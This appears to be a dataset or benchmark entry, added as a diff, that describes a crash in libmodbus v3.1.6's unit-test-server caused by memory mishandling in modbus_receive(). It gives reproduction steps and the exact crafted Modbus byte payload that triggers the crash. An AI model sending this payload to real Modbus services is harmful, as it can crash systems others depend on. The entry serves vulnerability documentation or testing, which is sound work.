@@ -1,0 +1,10 @@
+Number: 750
+
+Summarize:
+In libmodbus v3.1.6, sending a specific crafted message to the `unit-test-server` causes a crash. The report points to `modbus_receive()` and speculates that, after `malloc()` allocates memory, the function incorrectly manipulates the query pointer or accesses an out-of-bounds array, which then leads to `free(query)` failing with `free(): invalid pointer`. The demonstrated impact is a process crash.
+
+Reproduce:
+Use `unit-test-server` from libmodbus v3.1.6 as the target. Send the provided PoC message to it: `<03><dd><00><00><00><0d><ff><16><01><62><00><01><00><84><03><dd><00><00><00><0d><ff><17><01><62><00><01><00><84><00><01><02><00><01><02>`. The documented result is that the server crashes and reports: `free(): invalid pointer`.
+
+Payload:
+03 dd 00 00 00 0d ff 16 01 62 00 01 00 84 03 dd 00 00 00 0d ff 17 01 62 00 01 00 84 00 01 02 00 01 02
